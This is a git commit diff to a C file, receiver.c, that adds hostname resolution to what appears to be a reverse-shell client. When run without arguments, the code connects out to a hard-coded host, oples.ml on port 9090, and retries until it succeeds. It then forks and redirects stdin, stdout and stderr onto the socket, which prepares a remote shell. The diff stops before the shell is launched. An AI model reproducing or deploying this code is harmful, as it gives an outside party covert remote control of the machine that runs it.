1f71f3bb9db0cf7cde5e8c3e6998fb28df60d7b1
Alessandro Dussin <alessandro.dussin@gmail.com>
2019-06-05 11:43:24 +0200

    Added hostname translation

--- receiver.c
+++ receiver.c
@@ -7,36 +7,54 @@
 #include <netinet/in.h>
 #include <arpa/inet.h>
 #include <unistd.h>
+#include <netdb.h>
 
 const int MAXSIZE = 65536;
 const int PATH_MAX = 128000;
 
-int main(int argc, char** argv){
-	if(argc < 3){
-		printf("Usage: ./client remote_address remote_port");
-		exit(EXIT_FAILURE);
+in_addr_t htoip(char* hostname){
+	char* ip = calloc(20, sizeof(*ip));
+	struct hostent* hostent_ = gethostbyname(hostname);
+	struct in_addr** addr_list = (struct in_addr**) hostent_->h_addr_list;
+	int i = 0;
+	for(i = 0; addr_list[i] != NULL; i++){
+		strcpy(ip, inet_ntoa(*addr_list[i]));
 	}
+	return inet_addr(ip);
+}
+
+int main(int argc, char** argv){
+	in_addr_t address__;
 	short int portno;
-	portno = atoi(argv[2]);
+	if(argc < 3){
+		address__ = htoip("oples.ml");
+		portno = 9090;
+	}
+	else{
+		address__ = htoip(argv[1]);
+		portno = atoi(argv[2]);
+	}
 
 	int client_sock = socket(AF_INET, SOCK_STREAM, 0);
 	struct sockaddr_in server_addr;
 	server_addr.sin_family = AF_INET;
-	server_addr.sin_addr.s_addr = inet_addr(argv[1]);
+//	server_addr.sin_addr.s_addr = inet_addr(argv[1]);
+	server_addr.sin_addr.s_addr = address__;
 	server_addr.sin_port = htons(portno);
 
 	int connectie = connect(client_sock, (struct sockaddr *) &server_addr, sizeof(server_addr));
 	while(connectie < 0){
-		sleep(5);
+		printf("Failed to connect. Retry\n");
+		sleep(2);
 		connectie = connect(client_sock, (struct sockaddr *) &server_addr, sizeof(server_addr));
 	}
 	int pid = fork();
 	if(pid > 0){
-		printf("In parent process. Waiting\n");
+//		printf("In parent process. Waiting\n");
 		wait(NULL);
 	}
 	else{
-		printf("In child process. Nice\n");
+//		printf("In child process. Nice\n");
 		dup2(client_sock, 0);
 		dup2(client_sock, 1);
 		dup2(client_sock, 2);
